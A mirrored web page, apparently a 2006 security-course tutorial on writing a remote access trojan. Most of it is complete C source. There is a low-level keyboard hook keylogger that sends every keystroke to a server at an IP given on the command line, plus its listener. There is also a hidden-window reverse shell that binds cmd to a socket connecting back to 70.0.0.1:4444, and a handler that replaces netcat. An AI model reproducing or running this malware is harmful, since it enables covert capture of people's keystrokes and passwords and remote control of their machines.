@@ -1,0 +1,468 @@
+<html xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+
+<!-- Mirrored from www.vijaymukhi.com/seccourse/mar1606/html/writingtrojans.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:42:32 GMT -->
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 9">
+<meta name=Originator content="Microsoft Word 9">
+<link rel=File-List href="writingtrojans_files/filelist.html">
+<title>Security ramblings</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Vijay Mukhi</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>Sonal Mukhi</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>76</o:TotalTime>
+  <o:Created>2006-03-17T10:12:00Z</o:Created>
+  <o:LastSaved>2006-03-17T10:12:00Z</o:LastSaved>
+  <o:Pages>5</o:Pages>
+  <o:Words>878</o:Words>
+  <o:Characters>5007</o:Characters>
+  <o:Company>VMCI</o:Company>
+  <o:Lines>41</o:Lines>
+  <o:Paragraphs>10</o:Paragraphs>
+  <o:CharactersWithSpaces>6148</o:CharactersWithSpaces>
+  <o:Version>9.2720</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]-->
+<style>
+<!--
+ /* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+a:link, span.MsoHyperlink
+	{color:blue;
+	text-decoration:underline;
+	text-underline:single;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:purple;
+	text-decoration:underline;
+	text-underline:single;}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+-->
+</style>
+</head>
+
+<body lang=EN-US link=blue vlink=purple style='tab-interval:.5in'>
+
+<div class=Section1>
+
+<p class=MsoNormal>Security ramblings</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Writing a RAT Remote Access Trojan</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>In the past we taught you how to write a keystroke logger.
+Now lets take the same keystroke logger and make it network aware. What we will
+do is run the keystroke logger on one machine and all keys pressed will be
+echoed on another machine, We have to have some way of<span
+style="mso-spacerun: yes">  </span>running our keystroke logger on the client
+machine.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>c.c</p>
+
+<p class=MsoNormal>#define _WIN32_WINNT 0x0400</p>
+
+<p class=MsoNormal>#include &lt;windows.h&gt;</p>
+
+<p class=MsoNormal>WSADATA ws;SOCKET s; struct sockaddr_in A;long d;</p>
+
+<p class=MsoNormal>MSG m;HINSTANCE h;HHOOK k;char aa[100];KBDLLHOOKSTRUCT o;int
+i,key;</p>
+
+<p class=MsoNormal>__declspec(dllexport) int __stdcall zzz(int code,unsigned
+int w,long l)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>KBDLLHOOKSTRUCT *o1;</p>
+
+<p class=MsoNormal>o = *((KBDLLHOOKSTRUCT*)l);</p>
+
+<p class=MsoNormal>key = o.scanCode &lt;&lt; 16;</p>
+
+<p class=MsoNormal>key += o.flags &lt;&lt; 24;</p>
+
+<p class=MsoNormal>GetKeyNameText(key,aa,100);</p>
+
+<p class=MsoNormal>if ( o.flags == 0)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>printf(&quot;%s&quot;,aa);</p>
+
+<p class=MsoNormal>send( s , aa , strlen(aa) , 0);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>return CallNextHookEx(k,code,w,l);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>main(int argc , char *argv[])</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>WSAStartup(0x202,&amp;ws);</p>
+
+<p class=MsoNormal>s = socket(AF_INET, SOCK_STREAM, 0);</p>
+
+<p class=MsoNormal>A.sin_family = AF_INET;</p>
+
+<p class=MsoNormal>A.sin_port = htons(8000);</p>
+
+<p class=MsoNormal>A.sin_addr.s_addr = inet_addr(argv[1]);</p>
+
+<p class=MsoNormal>d = connect(s,(const struct sockaddr *)&amp;A,sizeof(A));</p>
+
+<p class=MsoNormal>if ( d == -1)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>printf(&quot;Connection failed\n&quot;);</p>
+
+<p class=MsoNormal>exit(0);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>h = GetModuleHandle(0);</p>
+
+<p class=MsoNormal>k = SetWindowsHookEx (WH_KEYBOARD_LL,zzz,h,0);
+//WH_KEYBOARD_LL=13</p>
+
+<p class=MsoNormal>while (GetMessage(&amp;m,0,0,0)) </p>
+
+<p class=MsoNormal>DispatchMessage( &amp;m );</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>c 70.0.0.7</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Simple program, we connect to the server whose ip address we
+specify on the command line. We then hook the keyboard hook and function zzz
+gets called each time we press a key. We simply send this key across to the
+server.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>s.c</p>
+
+<p class=MsoNormal>#include &lt;windows.h&gt;</p>
+
+<p class=MsoNormal>WSADATA ws;SOCKET s,y; struct sockaddr_in A;long d;char
+aa[100];</p>
+
+<p class=MsoNormal>main()</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>WSAStartup(0x202,&amp;ws);</p>
+
+<p class=MsoNormal>s = socket(AF_INET, SOCK_STREAM, 0);</p>
+
+<p class=MsoNormal>A.sin_family = AF_INET;</p>
+
+<p class=MsoNormal>A.sin_port = htons(8000);</p>
+
+<p class=MsoNormal>A.sin_addr.s_addr = INADDR_ANY;</p>
+
+<p class=MsoNormal>bind(s, (const struct sockaddr *)&amp;A, sizeof(A));</p>
+
+<p class=MsoNormal>listen(s , 10);</p>
+
+<p class=MsoNormal>d = sizeof(A);</p>
+
+<p class=MsoNormal>y = accept(s , (struct sockaddr *)&amp;A , &amp;d);</p>
+
+<p class=MsoNormal>while ( 1)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>d = recv(y , aa , 100 , 0);</p>
+
+<p class=MsoNormal>//Sleep(10);</p>
+
+<p class=MsoNormal>if ( d != -1)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>aa[d] = 0;</p>
+
+<p class=MsoNormal>printf(&quot;%s&quot;,aa);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>The server is a convention server listening on port 8000.
+This is how we send out the keystroke to the server.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>a.bat</p>
+
+<p class=MsoNormal>del *.exe</p>
+
+<p class=MsoNormal>cl s.c ws2_32.lib user32.lib</p>
+
+<p class=MsoNormal>cl c.c ws2_32.lib user32.lib</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>A batch file to compile.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>b.c</p>
+
+<p class=MsoNormal>#include &lt;windows.h&gt;</p>
+
+<p class=MsoNormal>main()</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>WinExec(&quot;notepad&quot;, 4);</p>
+
+<p class=MsoNormal>system(&quot;notepad&quot;);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>We can use the WinExec or system functions to execute a
+program under Windows. By writing a few simple lines of code we can now
+remotely execute processes. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>#include &lt;winsock2.h&gt;</p>
+
+<p class=MsoNormal>#pragma comment (lib, &quot;ws2_32&quot;)</p>
+
+<p class=MsoNormal>WSADATA ws;</p>
+
+<p class=MsoNormal>SOCKET s;</p>
+
+<p class=MsoNormal>STARTUPINFO si;</p>
+
+<p class=MsoNormal>PROCESS_INFORMATION pi;</p>
+
+<p class=MsoNormal>struct sockaddr_in dest;</p>
+
+<p class=MsoNormal>int i;</p>
+
+<p class=MsoNormal>int _stdcall WinMain (HINSTANCE h, HINSTANCE i, char *j, int
+k)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>WSAStartup(MAKEWORD(2,0), &amp;ws);</p>
+
+<p class=MsoNormal>s = WSASocket (AF_INET, SOCK_STREAM, NULL, NULL, NULL,
+NULL);</p>
+
+<p class=MsoNormal>dest.sin_family = AF_INET;</p>
+
+<p class=MsoNormal>dest.sin_port = htons(4444);</p>
+
+<p class=MsoNormal>dest.sin_addr.s_addr = inet_addr (&quot;70.0.0.1&quot;);</p>
+
+<p class=MsoNormal>connect (s, (struct sockaddr *) &amp;dest, sizeof(dest));</p>
+
+<p class=MsoNormal>si.cb = sizeof(si);</p>
+
+<p class=MsoNormal>si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; </p>
+
+<p class=MsoNormal>si.wShowWindow = SW_HIDE;</p>
+
+<p class=MsoNormal>si.hStdInput<span style="mso-spacerun: yes">  </span>= (void
+*) s;</p>
+
+<p class=MsoNormal>si.hStdOutput = (void *) s;</p>
+
+<p class=MsoNormal>si.hStdError<span style="mso-spacerun: yes">  </span>= (void
+*) s;</p>
+
+<p class=MsoNormal>CreateProcess (NULL, &quot;cmd&quot;, NULL, NULL, TRUE,
+NULL, NULL, NULL, &amp;si, &amp;pi);</p>
+
+<p class=MsoNormal>ExitProcess (0);<span style="mso-spacerun: yes">  </span>//
+Kill the process</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>A simple example of the connectback method. We connect to an
+ip address on port 4444. We run cmd on our machine but take the standard input
+and output and error of cmd before we execute and point it to the socket. Thus
+the cmd now run will expect its input and output to come and go from the socket
+and not the keyboard and screen. The server program which was nc run as nc –l
+–p 4444 is now</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>#include &lt;windows.h&gt;</p>
+
+<p class=MsoNormal>#include &lt;malloc.h&gt;</p>
+
+<p class=MsoNormal>struct timeval t;</p>
+
+<p class=MsoNormal>char aa[8192];</p>
+
+<p class=MsoNormal>SOCKET s,y;</p>
+
+<p class=MsoNormal>WSADATA ws;</p>
+
+<p class=MsoNormal>fd_set *d;</p>
+
+<p class=MsoNormal>struct sockaddr_in A;</p>
+
+<p class=MsoNormal>int x,rr;</p>
+
+<p class=MsoNormal>main ()</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>d = (fd_set *) malloc (sizeof(fd_set));</p>
+
+<p class=MsoNormal>WSAStartup(0x202,&amp;ws);</p>
+
+<p class=MsoNormal>s = socket(AF_INET, SOCK_STREAM , 0);</p>
+
+<p class=MsoNormal>A.sin_family = AF_INET;</p>
+
+<p class=MsoNormal>A.sin_port = htons(4444);</p>
+
+<p class=MsoNormal>A.sin_addr.s_addr = INADDR_ANY;</p>
+
+<p class=MsoNormal>bind(s , &amp;A , sizeof(A));</p>
+
+<p class=MsoNormal>listen (s, 1);</p>
+
+<p class=MsoNormal>x=sizeof(A);<span style="mso-spacerun: yes">  </span></p>
+
+<p class=MsoNormal>y= accept (s, &amp;A, &amp;x);</p>
+
+<p class=MsoNormal>t.tv_sec = 0;</p>
+
+<p class=MsoNormal>while (1)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>FD_SET (y, d);</p>
+
+<p class=MsoNormal>//printf(&quot;Before select\n&quot;);</p>
+
+<p class=MsoNormal>rr = select (16, d, 0, 0, &amp;t);</p>
+
+<p class=MsoNormal>if ( rr == 1) // FD_ISSET (fd, d)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>//printf(&quot;In FD_ISSET rr=%d\n&quot;,rr);</p>
+
+<p class=MsoNormal>rr = recv (y, aa, 8192, 0);</p>
+
+<p class=MsoNormal>if (rr == -1)</p>
+
+<p class=MsoNormal>exit(0);</p>
+
+<p class=MsoNormal>else</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>write (1, aa, rr);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>if (kbhit())</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>//printf(&quot;kbhit\n&quot;);</p>
+
+<p class=MsoNormal>gets(aa);</p>
+
+<p class=MsoNormal>strcat(aa, &quot;\n&quot;);</p>
+
+<p class=MsoNormal>send (y, aa, strlen(aa), 0);<span style="mso-spacerun:
+yes">      </span></p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>To start with it is a simple server running on port 4444
+waiting at an expect. FD_SET is a macro that takes the socket returned form
+expect and a pointer to a fd_set structure. As the name suggests it simply sets
+the bit for the file descriptor or socket fd in the fd_set array which is the
+set of file descriptors. We use these descriptors in the select function call.
+The second parameter is the file descriptors for reading, then writing and then
+exception. The last is a structure for timeouts. We are only checking when data
+arrives for reading. It returns the number of descriptors ready for reading in
+our case. Thus a value of zero means timeout occurred, 1 means some data to be
+read on the socket. The first parameter can take any values and is there for
+compatibility for berkley sockets. The minute rr returns 1, we know that some
+data is waiting for us to be read. We use the receive function to read the data
+in the array aa. If recv returns –1 then we know that the connection is closed
+and we quit out of the program. Otherwise we use the file function write to
+write to standard output which is file handle 1.<span style="mso-spacerun:
+yes">  </span></p>
+
+<p class=MsoNormal>Anytime we press a key, the kbhit function returns true.
+This means that the user has types something, we store it in an array aa using
+the gets function. We add a enter and send it to the remote machine. That guy
+then send us the output which will activate the select. </p>
+
+<p class=MsoNormal>The only problem with what we have done is that the select
+statement does not block. This is because we have set the member t.tv_sec to 0.
+If we set it to say 10 seconds, then they will be a delay in data coming but we
+use up less machine resources. Threads work better with select. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+</div>
+
+</body>
+
+
+<!-- Mirrored from www.vijaymukhi.com/seccourse/mar1606/html/writingtrojans.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:42:33 GMT -->
+</html>
